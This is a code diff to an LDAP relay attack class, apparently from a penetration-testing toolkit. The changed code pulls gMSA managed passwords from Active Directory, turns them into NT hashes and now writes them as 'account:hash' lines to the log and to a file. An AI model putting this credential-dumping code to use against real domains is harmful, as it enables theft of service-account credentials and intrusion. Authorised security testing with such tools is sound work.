@@ -679,21 +679,19 @@ class LDAPAttack(ProtocolAttack):
                 count = 0
                 for entry in self.client.response:
                     try:
-                        dn = "gMSA SAM: " + entry['attributes']['sAMAccountName']
+                        sam = entry['attributes']['sAMAccountName']
                         data = entry['attributes']['msDS-ManagedPassword']
                         blob = MSDS_MANAGEDPASSWORD_BLOB()
                         blob.fromString(data)
                         hash = MD4.new ()
                         hash.update (blob['CurrentPassword'][:-2])
-                        passwd = 'NT Hash: ' + binascii.hexlify(hash.digest()).decode("utf-8")
+                        passwd = binascii.hexlify(hash.digest()).decode("utf-8")
+                        userpass = sam + ':' + passwd
+                        LOG.info(userpass)
+                        count += 1
                         if fd is None:
                             fd = open(filename, "a+")
-                        count += 1
-                        LOG.debug(dn)
-                        LOG.debug(passwd)
-                        fd.write(dn)
-                        fd.write("\n")
-                        fd.write(passwd)
+                        fd.write(userpass)
                         fd.write("\n")
                     except:
                         continue
